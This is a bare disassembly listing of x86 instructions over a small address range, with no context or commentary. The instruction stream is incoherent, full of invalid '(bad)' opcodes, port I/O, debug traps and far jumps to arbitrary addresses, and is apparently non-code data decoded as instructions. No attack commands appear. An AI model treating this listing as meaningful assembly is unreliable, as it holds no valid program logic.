  416cd8:	add    BYTE PTR [esp+edi*2+0xe],dh
  416cdc:	sbb    edi,DWORD PTR [esi+ebp*2]
  416cdf:	call   0xce04:0xba7cffd8
  416ce6:	xchg   edi,eax
  416ce7:	out    dx,eax
  416ce8:	sar    BYTE PTR [ecx-0x3bc17a37],cl
  416cee:	ins    DWORD PTR es:[edi],dx
  416cef:	sub    bh,BYTE PTR [ebp+edi*2-0x49c4bee]
  416cf6:	lds    ebx,FWORD PTR [ebp+0x22]
  416cf9:	mov    eax,ds:0x21dac75e
  416cfe:	mov    ebx,0xd19c1800
  416d03:	rcr    BYTE PTR [ebx+eax*8-0x19],0xad
  416d08:	fist   WORD PTR [ebp-0x78]
  416d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d0c:	faddp  st(6),st
  416d0e:	icebp  
  416d0f:	repnz in al,dx
  416d11:	(bad)  
  416d12:	push   cs
  416d13:	into   
  416d14:	ja     0x416cf3
  416d16:	mov    ds:0xf1fd2666,eax
  416d1b:	cmp    BYTE PTR [ebp*4-0x4572b163],bl
  416d22:	mov    cl,0xf1
  416d24:	inc    ebp
  416d25:	or     eax,DWORD PTR [edx]
  416d27:	fld    DWORD PTR [ecx+edx*8+0x2b9b8e0d]
  416d2e:	das    
  416d2f:	popa   
  416d30:	push   ecx
  416d31:	add    BYTE PTR [eax-0x14447e89],dl
  416d37:	add    eax,ecx
  416d39:	push   es
  416d3a:	rcr    DWORD PTR [ebx-0x7],0x9a
  416d3e:	cmp    al,0xb7
  416d40:	adc    al,0x63
  416d43:	lods   al,BYTE PTR ds:[esi]
  416d44:	std    
  416d45:	sbb    eax,0x95534247
  416d4a:	fbld   TBYTE PTR [edx-0x4d]
  416d4d:	mov    ch,0xae
  416d4f:	pushf  
  416d50:	sub    edx,DWORD PTR [esi+eiz*4+0x3dc3ea18]
  416d57:	repz addr16 xor edi,edx
  416d5b:	add    BYTE PTR [edx+ecx*8],cl
  416d5e:	(bad)  
  416d5f:	loopne 0x416d95
  416d61:	cli    
  416d62:	div    BYTE PTR [ecx]
  416d64:	cmp    ecx,edx
  416d66:	and    DWORD PTR [eax+0x2c1c0478],esp
  416d6c:	jle    0x416d28
  416d6e:	xor    ebx,edx
  416d70:	sti    
  416d71:	(bad)  
  416d72:	ja     0x416dd8
  416d74:	push   cs
  416d75:	cld    
  416d76:	scas   eax,DWORD PTR es:[edi]
  416d77:	sbb    ebx,esi
  416d79:	push   eax
  416d7a:	adc    DWORD PTR [edx-0x30],edi
  416d7d:	jle    0x416d65
  416d7f:	mov    ebp,0x4ce58eb6
  416d84:	lods   eax,DWORD PTR ds:[esi]
  416d85:	mov    esi,0x1278676
  416d8a:	mov    ds:0x1fd2d13c,al
  416d8f:	jg     0x416df9
  416d91:	sub    ecx,DWORD PTR fs:0xea96d029
  416d98:	jbe    0x416dd6
  416d9a:	jmp    0x38e:0x76af071a
  416da1:	call   0x16c9dbc2
  416da6:	mov    ebx,0xb529e6d1
  416dab:	pop    eax
  416dac:	cmc    
  416dad:	push   eax
  416dae:	jmp    0x451318e0
  416db3:	cmp    BYTE PTR [esi+0x22],0x58
  416db7:	sti    
  416db8:	or     al,0xf9
  416dba:	ins    BYTE PTR es:[edi],dx
  416dbb:	(bad)  
  416dbd:	stc    
  416dbe:	arpl   ax,bp
  416dc0:	cs jno 0x416dd2
  416dc3:	shl    DWORD PTR [esi],cl
  416dc5:	fsub   QWORD PTR [eax+eiz*2]
  416dc8:	ins    BYTE PTR es:[edi],dx
  416dc9:	xor    eax,0x1eb5c1bf
  416dce:	jecxz  0x416e31
  416dd0:	daa    
  416dd1:	mov    ds:0x97403714,eax
  416dd6:	xchg   ecx,eax
  416dd7:	sub    eax,0x15b86416
  416ddc:	or     al,0x56
  416dde:	(bad)  
  416ddf:	mov    ah,0x98
  416de1:	dec    ecx
  416de2:	jb     0x416d6f
  416de4:	jg     0x416dea
  416de6:	pop    es
  416de7:	jle    0x416d91
  416de9:	jo     0x416e08
  416deb:	loopne 0x416e02
  416ded:	lds    ebx,FWORD PTR [eax+0x5abf8e27]
  416df3:	xchg   ecx,eax
  416df4:	mov    bh,0xb6
  416df6:	fistp  WORD PTR [esp+ebp*4]
  416df9:	dec    edx
  416dfa:	fistp  WORD PTR [ebx+eax*4+0x3618139a]
  416e01:	pop    edx
  416e02:	rol    al,0xb4
  416e05:	cwde   
  416e06:	xor    DWORD PTR [esi-0x5383aa2c],ecx
  416e0c:	xchg   ebx,eax
  416e0d:	mov    bh,0x55
  416e0f:	bnd jl 0x416dd4
  416e12:	scas   eax,DWORD PTR es:[edi]
  416e13:	mov    ebp,0xb85b9a4f
  416e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e19:	retf   0x35cd
  416e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e1d:	fsub   QWORD PTR [esi-0x4c]
  416e20:	fwait
  416e21:	dec    edi
  416e22:	push   eax
  416e23:	dec    ecx
  416e24:	adc    cl,dl
  416e26:	jns    0x416e81
  416e28:	(bad)  
  416e29:	mov    BYTE PTR [ebx],0x43
  416e2c:	pushf  
  416e2d:	xchg   esp,eax
  416e2e:	and    bh,BYTE PTR [edi+0x35]
  416e31:	mov    bl,0x4f
  416e33:	push   0xca1f2d4b
  416e38:	in     eax,dx
  416e39:	(bad)  
  416e3a:	jmp    0x54e3:0x68c1d6c1
  416e41:	imul   ebp,DWORD PTR [ebp+0x7c],0xffffffc1
  416e45:	test   ebp,eax
  416e47:	cmp    edx,DWORD PTR [ecx-0x3c]
  416e4a:	loopne 0x416ecb
  416e4c:	jne    0x416e61
  416e4e:	imul   ebx,edi,0xb9561036
  416e54:	shl    DWORD PTR [edx],0x1c
  416e57:	adc    ebp,esi
  416e59:	add    BYTE PTR [edx+ecx*1-0x3c],0x7f
  416e5e:	cli    
  416e5f:	mov    WORD PTR [ebx-0x65a64f4],es
  416e65:	add    BYTE PTR [edx+0x3eaa0a99],0x9f
  416e6c:	inc    DWORD PTR [edx]
  416e6e:	sub    DWORD PTR [ecx-0x6375e0c9],esi
  416e74:	addr16 mov edi,0x65702f17
  416e7a:	fs pop esp
  416e7c:	ja     0x416e2f
  416e7e:	push   0x2488017
  416e83:	jmp    0xcf667da4
  416e88:	test   eax,0x9a2cfeb
  416e8d:	outs   dx,BYTE PTR ds:[esi]
  416e8e:	mov    ebx,ebp
  416e90:	(bad)  
  416e91:	fdivp  st(3),st
  416e93:	pop    ecx
  416e94:	das    
  416e95:	mov    dh,0x2d
  416e97:	or     DWORD PTR [ebx+edi*1+0x72],ebp
  416e9b:	mov    ah,0x5a
  416e9d:	sub    edi,0xa1456949
  416ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ea4:	xor    cl,BYTE PTR [esi+0x1b]
  416ea7:	pop    eax
  416ea8:	and    al,0x49
  416eaa:	int    0xef
  416eac:	popf   
  416ead:	es xchg esp,eax
  416eaf:	in     al,dx
  416eb0:	xchg   edi,eax
  416eb1:	in     eax,dx
  416eb2:	inc    esi
  416eb3:	test   al,0xe
  416eb5:	icebp  
  416eb6:	retf   0xf5cc
  416eb9:	aas    
  416eba:	or     DWORD PTR [edx],edi
  416ebc:	mov    ebx,0xf7e9ffa2
  416ec1:	or     DWORD PTR [ecx],edx
  416ec3:	adc    esp,DWORD PTR [eax+0xb7a4977]
  416ec9:	cdq    
  416eca:	jmp    0x57d6:0x5575b19
  416ed1:	jae    0x416ef7
  416ed3:	fsubr  st(4),st
  416ed5:	neg    BYTE PTR [ebp-0xe]
  416ed8:	inc    ebp
  416ed9:	add    al,BYTE PTR [ebp+0x7a]
  416edc:	das    
  416edd:	inc    BYTE PTR [eax]
  416edf:	push   eax
  416ee0:	les    edi,FWORD PTR [ecx]
  416ee2:	push   es
  416ee3:	push   0xffffff80
  416ee5:	cli    
  416ee6:	jae    0x416f26
  416ee8:	inc    edx
  416ee9:	pop    ss
  416eea:	(bad)  
  416eeb:	shr    BYTE PTR [esi+0x23],cl
  416eee:	inc    esi
  416eef:	pusha  
  416ef0:	jns    0x416ea0
  416ef2:	fnstsw WORD PTR [ebp-0x7a]
  416ef5:	pop    es
  416ef6:	aas    
  416ef7:	js     0x416f19
  416ef9:	adc    BYTE PTR [esi-0x6eec64de],bh
  416eff:	sub    BYTE PTR es:[edi+0x40a7e1b1],0x9e
  416f07:	mov    edx,0xc7563cff
  416f0c:	push   ebp
  416f0d:	pop    ds
  416f0e:	add    DWORD PTR [ecx],ecx
  416f10:	inc    ecx
  416f11:	or     edx,DWORD PTR [ebp+0x348eb33b]
  416f17:	mov    edx,0x7b082fb8
  416f1c:	into   
  416f1d:	mov    dh,0x91
  416f1f:	iret   
  416f20:	dec    eax
  416f21:	cli    
  416f22:	in     al,0xa9
  416f24:	repz push ebx
  416f26:	jne    0x416eef
  416f28:	or     al,0x5b
  416f2a:	cdq    
  416f2b:	adc    edx,ecx
  416f2d:	fcom   DWORD PTR [esi-0x1595a5a]
  416f33:	push   edx
  416f34:	js     0x416f92
  416f36:	pop    edx
  416f37:	mov    WORD PTR [esi+0x5e8bdb03],?
  416f3d:	and    edi,DWORD PTR [esi-0x22d1e946]
  416f43:	inc    ebp
  416f44:	sbb    DWORD PTR [esi-0x196aba71],ecx
  416f4a:	clc    
  416f4b:	or     edi,edx
  416f4d:	(bad)
  416f50:	mov    dl,BYTE PTR [ebp+0x2ea0b0b2]
  416f56:	xchg   ecx,eax
  416f57:	es pop ecx
  416f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f5a:	inc    edx
  416f5b:	cmp    eax,0xc1b4d05e
  416f60:	mov    al,ds:0x689b19ef
  416f65:	pop    ebp
  416f66:	pop    ebx
  416f67:	imul   edx,DWORD PTR [eax+0x74],0xd
  416f6b:	test   BYTE PTR [ebp+ebp*4+0x6591e75b],bl
  416f72:	stc    
  416f73:	fistp  QWORD PTR ds:0xec8ac2df
  416f79:	sbb    dh,bl
  416f7b:	jae    0x416fd3
  416f7d:	out    0xf4,eax
  416f7f:	out    0x6,eax
  416f81:	int3   
  416f82:	mov    ?,WORD PTR [esi+0x78e49eb7]
  416f88:	sub    BYTE PTR [ecx+0x165dcdda],dh
  416f8e:	xor    esi,DWORD PTR [eax+0x23bd97f0]
  416f94:	lods   eax,DWORD PTR ds:[esi]
  416f95:	push   ecx
  416f96:	ds mov dh,ah
  416f99:	pop    esp
  416f9a:	lds    esp,FWORD PTR [esp+edx*8+0x4930bb10]
  416fa1:	outs   dx,BYTE PTR ds:[esi]
  416fa2:	push   edi
  416fa3:	aas    
  416fa4:	rcl    DWORD PTR ss:[edx+0x69faabc8],cl
  416fab:	(bad)  
  416fac:	ds sti 
  416fae:	or     BYTE PTR [ecx-0x17],0x9f
  416fb2:	(bad)  
  416fb3:	xchg   edi,eax
  416fb4:	jb     0x416f82
  416fb6:	sar    BYTE PTR [eax-0x11],0xb3
  416fba:	daa    
  416fbb:	fistp  WORD PTR [edx+esi*2-0x37524b3c]
  416fc2:	mov    ds:0x1fbd21e7,eax
  416fc7:	sbb    cl,ah
  416fc9:	jnp    0x417016
  416fcb:	push   ebp
  416fcc:	loop   0x416fa8
  416fce:	inc    eax
  416fcf:	mov    eax,0x6f6e43b
  416fd4:	inc    dx
  416fd6:	test   ah,dl
  416fd8:	pop    esp
  416fd9:	xchg   esi,eax
  416fda:	pop    ebp
  416fdb:	test   DWORD PTR [ebx+0x7f168b4f],ebx
  416fe1:	pop    es
  416fe2:	mov    cl,0x49
  416fe4:	arpl   di,cx
  416fe6:	jb     0x417021
  416fe8:	dec    esi
  416fe9:	rol    BYTE PTR [ecx+edx*8+0x6f],1
  416fed:	aas    
  416fee:	scas   al,BYTE PTR es:[edi]
  416fef:	or     DWORD PTR [eax+eiz*4],esi
  416ff2:	jo     0x416f74
  416ff4:	leave  
  416ff5:	jo     0x417057
  416ff7:	icebp  
  416ff8:	mov    esi,0x50f4c480
  416ffd:	cmp    eax,0xa244153d
  417002:	lea    edi,[eax-0x7ed9c09d]
  417008:	inc    eax
  417009:	out    0xde,al
  41700b:	and    DWORD PTR [ecx-0x11],edi
  41700e:	add    ebp,ebx
  417010:	pop    esp
  417011:	cmc    
  417012:	inc    esp
  417013:	and    BYTE PTR [ebp+edx*8-0x4bc7e2e4],al
  41701a:	jne    0x41703a
  41701c:	cmc    
  41701d:	jg     0x41702b
  41701f:	lds    ecx,FWORD PTR [edx]
  417021:	sbb    BYTE PTR [edx],bh
  417023:	shl    DWORD PTR [ebx+0x3e],1
  417026:	lock jae 0x41706d
  417029:	jmp    0x416fbc
  41702b:	jns    0x416fb5
  41702d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41702e:	dec    ecx
  41702f:	std    
  417030:	pushf  
  417031:	push   ecx
  417032:	sub    al,0xc9
  417034:	inc    ebx
  417035:	dec    esp
  417036:	clc    
  417037:	jge    0x4170b0
  417039:	and    dl,ah
  41703b:	loop   0x416fe8
  41703d:	sub    esp,DWORD PTR [esp+edx*2+0x37]
  417041:	adc    bl,0x13
  417044:	mov    WORD PTR [ecx-0x49],?
  417047:	jnp    0x41705a
  417049:	call   0xe1b5bca1
  41704e:	ins    BYTE PTR es:[edi],dx
  41704f:	icebp  
  417050:	add    BYTE PTR [ecx+0x5b50dfc1],dl
  417056:	and    edx,DWORD PTR [ebp+0x6cd5c0f6]
  41705c:	mov    ss,WORD PTR [ecx-0x79]
  41705f:	mov    dh,0xe2
  417061:	xchg   ebx,eax
  417062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417063:	lea    eax,[ebp+0x37]
  417066:	ds push es
  417068:	sbb    esp,DWORD PTR [ecx+edx*1+0x6683e324]
  41706f:	jecxz  0x41707c
  417071:	dec    eax
  417072:	popf   
  417073:	pop    esp
  417074:	push   0xffffff9e
  417076:	pop    es
  417077:	gs test esp,ebx
  41707a:	(bad)  
  41707b:	cmp    al,0x77
  41707d:	jns    0x41705c
  41707f:	sub    edx,0x91c52b63
  417085:	sbb    dh,BYTE PTR [eax+0x1e]
  417088:	not    DWORD PTR [edi-0x2a9cd843]
  41708e:	hlt    
  41708f:	js     0x4170e6
  417091:	sub    eax,0x34065d82
  417096:	lds    esp,FWORD PTR fs:0x844fec52
  41709d:	ficom  WORD PTR [ecx]
  41709f:	dec    ecx
  4170a0:	dec    edi
  4170a1:	mov    ds:0xe4805379,al
  4170a6:	imul   ebp
  4170a8:	sbb    ecx,ecx
  4170aa:	dec    esi
  4170ab:	push   0x6e54cdce
  4170b0:	je     0x41706c
  4170b2:	pop    ebp
  4170b3:	mov    eax,ds:0xbe6f43d8
  4170b8:	push   esp
  4170b9:	pop    edx
  4170ba:	jmp    DWORD PTR [ebp-0x3cfa7a59]
  4170c0:	and    eax,0x51adf7fb
  4170c5:	or     BYTE PTR [edx],ah
  4170c7:	xor    edx,0x3cb3376d
  4170cd:	or     eax,0xce9a9760
  4170d2:	adc    eax,0x62f2a05f
  4170d7:	sub    al,0x5e
  4170d9:	mov    ds:0x2c598e4,al
  4170de:	inc    edi
  4170df:	cmp    bh,dl
  4170e1:	push   es
  4170e2:	or     eax,0x155cda4
  4170e7:	push   ds
  4170e8:	je     0x4170e9
  4170ea:	std    
  4170eb:	jge    0x417072
  4170ed:	push   ds
  4170ee:	or     eax,0x41ccf6ca
  4170f3:	in     eax,dx
  4170f4:	jecxz  0x41709c
  4170f6:	and    al,BYTE PTR [esi]
  4170f8:	mov    DWORD PTR [esi],esp
  4170fa:	fimul  WORD PTR [edx-0x80]
  4170fd:	dec    esi
  4170fe:	push   edx
  4170ff:	dec    esi
  417100:	lahf   
  417101:	and    ecx,eax
  417103:	xor    ch,BYTE PTR [edx]
  417105:	popa   
  417106:	out    0x3f,eax
  417108:	jae    0x41716b
  41710a:	loop   0x417161
  41710c:	sbb    al,0xd2
  41710e:	push   0x9b65e639
  417113:	sub    al,0xd4
  417115:	shl    DWORD PTR [ecx+eax*2+0x17],1
  417119:	fcomp  QWORD PTR [ebx]
  41711b:	es xchg edi,eax
  41711d:	das    
  41711e:	and    DWORD PTR [ebx+eax*8],ebp
  417121:	fdiv   st,st(4)
  417123:	fld    TBYTE PTR [esi+0x58a45a3e]
  417129:	and    DWORD PTR [eax-0xc],ebp
  41712c:	sub    al,0xd0
  41712e:	lds    edi,FWORD PTR [edx-0x49]
  417131:	dec    eax
  417132:	mov    eax,ds:0x2864aef5
  417137:	and    edx,DWORD PTR [ecx-0x46]
  41713a:	dec    esi
  41713b:	fsubr  st(2),st
  41713d:	(bad)  
  41713e:	push   ebx
  41713f:	lock jbe 0x417102
  417142:	loop   0x4170dc
  417144:	mov    ebp,0x30b6c205
  417149:	outs   dx,DWORD PTR ds:[esi]
  41714a:	aaa    
  41714b:	loopne 0x4170cd
  41714d:	mov    esi,0x8d06d405
  417152:	loope  0x417140
  417154:	push   0xffffffb3
  417156:	clc    
  417157:	push   edi
  417158:	cmp    dh,BYTE PTR [ecx]
  41715a:	cmp    al,0xc1
  41715c:	mov    ecx,0x13765ce6
  417161:	and    eax,0xd392ae2a
  417166:	mov    bl,al
  417168:	repnz aad 0x83
  41716b:	dec    eax
  41716c:	loope  0x4171ca
  41716e:	add    edx,0xffffffe6
  417171:	inc    ecx
  417172:	or     BYTE PTR [esi+0xe],0xa1
  417176:	retf   
  417177:	or     eax,0x1491e4ce
  41717c:	call   0xbfd7623b
  417181:	cmp    al,0xf8
  417183:	popa   
  417184:	mov    eax,DWORD PTR [esi+ebp*8]
  417187:	icebp  
  417188:	retf   
  417189:	or     al,0x73
  41718b:	push   esi
  41718c:	push   eax
  41718d:	pusha  
  41718e:	inc    edx
  41718f:	push   ebp
  417190:	inc    edx
  417191:	arpl   WORD PTR [edx+0x37094191],cx
  417197:	ja     0x417201
  417199:	pop    ss
  41719a:	xchg   ebx,eax
  41719b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41719c:	jecxz  0x4171e8
  41719e:	jnp    0x417140
  4171a0:	add    ch,ch
  4171a2:	rol    ebp,1
  4171a4:	jle    0x4171b1
  4171a6:	xchg   ebx,eax
  4171a7:	push   ebp
  4171a8:	sub    DWORD PTR [eax],edi
  4171aa:	aam    0x41
  4171ac:	rcr    BYTE PTR ds:0x57efd0ce,cl
  4171b2:	outs   dx,DWORD PTR ds:[esi]
  4171b3:	jo     0x417210
  4171b5:	(bad)  
  4171b6:	rol    DWORD PTR [ebp-0x7e],1
  4171b9:	ret    
  4171ba:	pop    eax
  4171bb:	rcl    BYTE PTR [ebx+0xee1eb41],cl
  4171c1:	push   ds
  4171c2:	sbb    DWORD PTR [edi],edi
  4171c4:	jno    0x4171ad
  4171c6:	les    edi,FWORD PTR [ebx]
  4171c8:	icebp  
  4171c9:	sub    BYTE PTR [ecx-0x14],cl
  4171cc:	test   ah,ch
  4171ce:	pminsw mm3,mm0
  4171d1:	sbb    DWORD PTR [ecx+0x23],ebp
  4171d4:	mov    esp,0x4e83a01a
  4171d9:	in     eax,0xe0
  4171db:	scas   al,BYTE PTR es:[edi]
  4171dc:	mov    esp,esi
  4171de:	mov    DWORD PTR [ebx-0x54],ecx
  4171e1:	(bad)  
  4171e2:	add    al,0x3a
  4171e4:	lahf   
  4171e5:	icebp  
  4171e6:	push   esp
  4171e7:	xor    edi,DWORD PTR ds:0xa5c6b5f3
  4171ed:	jl     0x417208
  4171ef:	out    dx,eax
  4171f0:	data16 loopne 0x41725c
  4171f3:	push   ds
  4171f4:	fistp  DWORD PTR [eax]
  4171f6:	xor    eax,0x2c754fa
  4171fb:	(bad)  
  4171fd:	arpl   WORD PTR [ebx-0x70861e92],bx
  417203:	pusha  
  417204:	and    DWORD PTR [eax-0x24bd1b67],0xffffff80
  41720b:	xchg   DWORD PTR [edi+0x55],esp
  41720e:	mov    bl,0x92
  417210:	ror    ebx,1
  417212:	loopne 0x417277
  417214:	inc    esi
  417215:	push   edx
  417216:	xor    BYTE PTR [ebp-0x4d7ba654],ch
  41721c:	in     al,0x6
  41721e:	icebp  
  41721f:	add    al,BYTE PTR [esi+0x2b65284c]
  417225:	outs   dx,DWORD PTR ds:[esi]
  417226:	add    dl,BYTE PTR [edi-0x714d2aba]
  41722c:	js     0x41720b
  41722e:	pop    ebx
  41722f:	outs   dx,DWORD PTR ds:[esi]
  417230:	mov    edi,ebp
  417232:	inc    edx
  417233:	push   ecx
  417234:	in     eax,dx
  417235:	mov    bl,0xb
  417237:	xchg   ebx,eax
  417238:	fistp  DWORD PTR [esi]
  41723a:	sub    eax,DWORD PTR [edx+0x279b94fd]
  417240:	aad    0xf0
  417242:	outs   dx,BYTE PTR ds:[esi]
  417243:	leave  
  417244:	adc    cl,BYTE PTR [ebx]
  417246:	jno    0x417265
  417248:	sub    DWORD PTR ds:0xca81d946,0x74d88ed9
  417252:	jle    0x4171e1
  417254:	stc    
  417255:	xor    BYTE PTR [ecx],0xc4
  417258:	sub    DWORD PTR [eax],ecx
  41725a:	pop    eax
  41725b:	shr    BYTE PTR [eax-0x336cf7b5],cl
  417261:	xchg   edx,eax
  417262:	mov    bh,0x1f
  417264:	das    
  417265:	add    BYTE PTR [edx+0x14864344],dh
  41726b:	popa   
  41726c:	fiadd  DWORD PTR [edx]
  41726e:	mov    ss,WORD PTR [edi]
  417270:	iret   
  417271:	jle    0x41722c
  417273:	cwde   
  417274:	ret    
  417275:	sub    eax,0x54cd7a2b
  41727a:	mov    dh,0x1f
  41727c:	xchg   edi,eax
  41727d:	jl     0x417299
  41727f:	gs out 0xa6,al
  417282:	xchg   ebx,eax
  417283:	aas    
  417284:	bound  esp,QWORD PTR [edx+0x8]
  417287:	mov    ch,0x1b
  417289:	out    dx,al
  41728a:	shr    DWORD PTR [edi],1
  41728c:	dec    esi
  41728d:	scas   eax,DWORD PTR es:[edi]
  41728e:	lea    ebx,[edx+esi*4-0x235341e2]
  417295:	sub    cl,bh
  417297:	(bad)  
  417298:	cli    
  417299:	call   0xf0eebdb2
  41729e:	imul   ebp,DWORD PTR [ecx-0x5575d49a],0xffffffff
  4172a5:	pop    edi
  4172a6:	jge    0x4172b9
  4172a8:	je     0x4172d2
  4172aa:	cmp    dh,BYTE PTR [edx-0x6b]
  4172ad:	mov    edx,DWORD PTR [edi-0x4b]
  4172b0:	imul   ecx,DWORD PTR [ebx],0x652a3ccd
  4172b6:	loopne 0x4172ab
  4172b8:	and    eax,0xc3932c9b
  4172bd:	sti    
  4172be:	add    al,0xec
  4172c0:	ins    DWORD PTR es:[edi],dx
  4172c1:	icebp  
  4172c2:	xchg   esp,eax
  4172c3:	mov    dh,0xb
  4172c5:	(bad)  
  4172c6:	and    edx,ebx
  4172c8:	inc    esp
  4172c9:	outs   dx,BYTE PTR ds:[esi]
  4172ca:	shl    DWORD PTR [ebp+0x56],0xc6
  4172ce:	add    eax,0xff6fc823
  4172d3:	bound  edi,QWORD PTR [eax+0x3e]
  4172d6:	aas    
  4172d7:	xchg   ebp,eax
  4172d8:	sbb    ecx,esi
  4172da:	retf   
  4172db:	retf   
  4172dc:	cmp    al,0x6f
  4172de:	call   0x3cf3dfbc
  4172e3:	aaa    
  4172e4:	stc    
  4172e5:	inc    edx
  4172e6:	push   esp
  4172e7:	js     0x41730f
  4172e9:	mov    DWORD PTR [ecx+0x2c],esp
  4172ec:	add    DWORD PTR [edx],edx
  4172ee:	int3   
  4172ef:	(bad)  
  4172f0:	popa   
  4172f1:	and    bh,cl
  4172f3:	inc    eax
  4172f4:	int    0x7d
  4172f6:	(bad)  
  4172f7:	jae    0x4172f0
  4172f9:	into   
  4172fa:	jb     0x4172ca
  4172fc:	sti    
  4172fd:	jle    0x4172ab
  4172ff:	stos   BYTE PTR es:[edi],al
  417300:	in     al,dx
  417301:	inc    esi
  417302:	xor    eax,0x3c87c62e
  417307:	push   DWORD PTR [ecx]
  417309:	mov    eax,ds:0x7defe84c
  41730e:	sbb    BYTE PTR [ecx],cl
  417310:	xchg   ecx,eax
  417311:	mov    al,ds:0xf657e3be
  417316:	inc    esi
  417317:	xor    bh,ah
  417319:	popw   ds
  41731b:	dec    esp
  41731c:	adc    al,0x32
  41731e:	push   ecx
  41731f:	in     eax,dx
  417320:	add    cl,dl
  417322:	fild   QWORD PTR [esi-0x68]
  417325:	jp     0x4172e0
  417327:	stos   DWORD PTR es:[edi],eax
  417328:	ja     0x417317
  41732a:	push   0x3923aeaa
  41732f:	push   eax
  417330:	sbb    dl,dh
  417332:	dec    edx
  417333:	std    
  417334:	lods   eax,DWORD PTR ds:[esi]
  417335:	cld    
  417336:	pop    ecx
  417337:	data16 sbb BYTE PTR [ecx+0x28829e33],bh
  41733e:	in     al,0x65
  417340:	mov    esi,0xe3c79562
  417345:	cs pusha 
  417347:	mov    dl,0x31
  417349:	in     eax,dx
  41734a:	not    edi
  41734c:	fldenv ds:0x93504452
  417353:	stos   BYTE PTR es:[edi],al
  417354:	add    ah,BYTE PTR ds:0xc8760916
  41735a:	adc    DWORD PTR [esp+ebx*4],edi
  41735d:	rcl    BYTE PTR [ebx+eiz*4-0x51],0xd8
  417362:	imul   ebx,edi,0xffffff88
  417365:	retf   0x8d3b
  417368:	jo     0x4173b4
  41736a:	lahf   
  41736b:	call   0x9510c804
  417370:	inc    esi
  417371:	icebp  
  417372:	pop    ss
  417373:	sar    DWORD PTR [edx],cl
  417375:	es and eax,0x127046c7
  41737b:	das    
  41737c:	imul   edi,DWORD PTR [edi],0x4bdad6ae
  417382:	fnstcw WORD PTR ds:0x67a89c57
  417388:	loop   0x41735b
  41738a:	pushf  
  41738b:	shr    ebx,0x46
  41738e:	push   ebp
  41738f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417390:	int    0xf
  417392:	in     eax,dx
  417393:	inc    ebx
  417394:	jae    0x417414
  417396:	cmp    BYTE PTR [eax],bl
  417398:	mov    ah,BYTE PTR [edi+0xf]
  41739b:	int3   
  41739c:	lock sub DWORD PTR [ebx-0x21],eax
  4173a0:	xchg   BYTE PTR [edx-0x5d689fcb],ah
  4173a6:	test   eax,0xcfb05dee
  4173ab:	test   al,0x60
  4173ad:	pop    ss
  4173ae:	dec    ebp
  4173af:	imul   ebx,esp,0xf15ee068
  4173b5:	fstp   QWORD PTR [ebp+0x3f]
  4173b8:	inc    edx
  4173b9:	mov    ch,0xc1
  4173bb:	mov    ah,0x63
  4173bd:	ret    
  4173be:	ins    BYTE PTR es:[edi],dx
  4173bf:	and    eax,0xbd21a2e3
  4173c4:	pop    ss
  4173c5:	idiv   BYTE PTR [ebx+0x2f73ae83]
  4173cb:	cmp    dl,dh
  4173cd:	pushf  
  4173ce:	add    bl,ch
  4173d0:	pop    ss
  4173d1:	mov    ebp,0x81823d7d
  4173d6:	add    ebp,edx
  4173d8:	mov    eax,0xc0207cfb
  4173dd:	inc    esp
  4173de:	imul   edx,DWORD PTR [edi+0x5c9c99af],0xe
  4173e5:	scas   al,BYTE PTR es:[edi]
  4173e6:	in     eax,dx
  4173e7:	ins    DWORD PTR es:[edi],dx
  4173e8:	stos   BYTE PTR es:[edi],al
  4173e9:	test   eax,0x36aa1070
  4173ee:	scas   al,BYTE PTR es:[edi]
  4173ef:	push   ds
  4173f0:	adc    ch,BYTE PTR [ebx+0x60]
  4173f3:	cmp    eax,0x5d3cd78b
  4173f8:	push   ebp
  4173f9:	pop    edx
  4173fa:	(bad)  
  4173fb:	clc    
  4173fc:	cmp    eax,0x70b0fa11
  417401:	mov    eax,ds:0xbcca4b2c
  417406:	mov    fs,WORD PTR [ebx+ebx*2-0x36185d15]
  41740d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41740e:	bswap  esp
  417410:	jns    0x4173dc
  417412:	ret    
  417413:	rol    DWORD PTR [ebx],1
  417415:	daa    
  417416:	fstp   DWORD PTR [edx]
  417418:	cmp    al,0x94
  41741a:	adc    ah,BYTE PTR [ebp+0x2f3c43ce]
  417420:	mov    edi,0xa87cfd91
  417425:	pop    esi
  417426:	(bad)  
  417427:	cwde   
  417428:	aaa    
  417429:	mov    ebx,0x91311fa7
  41742e:	in     al,dx
  41742f:	and    al,ch
  417431:	sub    al,0xc4
  417433:	pop    ebp
  417434:	retf   
  417435:	sbb    bl,dh
  417437:	xlat   BYTE PTR ds:[bx]
  417439:	imul   esp,DWORD PTR [ecx],0xffffffdd
  41743c:	xor    al,0xcd
  41743e:	mov    ebx,0x84669fcb
  417443:	outs   dx,BYTE PTR ds:[esi]
  417444:	ins    DWORD PTR es:[edi],dx
  417445:	xor    al,0x4
  417447:	rol    DWORD PTR [bp+di],0x16
  41744b:	test   BYTE PTR [esi+0xc],al
  41744e:	in     al,dx
  41744f:	mov    eax,0x272b58b3
  417454:	inc    ecx
  417455:	mov    eax,0x63278db0
  41745a:	cmp    BYTE PTR [ebp+ebp*8-0x5dcb3562],al
  417461:	jns    0x417415
  417463:	mov    ds:0xfe914f9b,eax
  417468:	loop   0x4174d3
  41746a:	int    0x93
  41746c:	and    eax,DWORD PTR [edi+0x3d]
  41746f:	lea    esp,[edi]
  417471:	adc    DWORD PTR [edi-0x749845c3],ecx
  417477:	shld   DWORD PTR [esi-0x13],edi,0xea
  41747c:	push   edi
  41747d:	mov    ch,BYTE PTR [edx-0x80]
  417480:	fidiv  WORD PTR [eax+0x3bdce88c]
  417486:	mov    WORD PTR [edi-0x251e450f],ss
  41748c:	sbb    DWORD PTR [esi],0x7a
  41748f:	jle    0x4174cf
  417491:	sti    
  417492:	rcr    BYTE PTR [ebx],1
  417494:	xchg   ebx,eax
  417495:	pop    ecx
  417496:	jp     0x41748f
  417498:	jp     0x41745c
  41749a:	ror    DWORD PTR [edi],1
  41749c:	repnz icebp 
  41749e:	pushf  
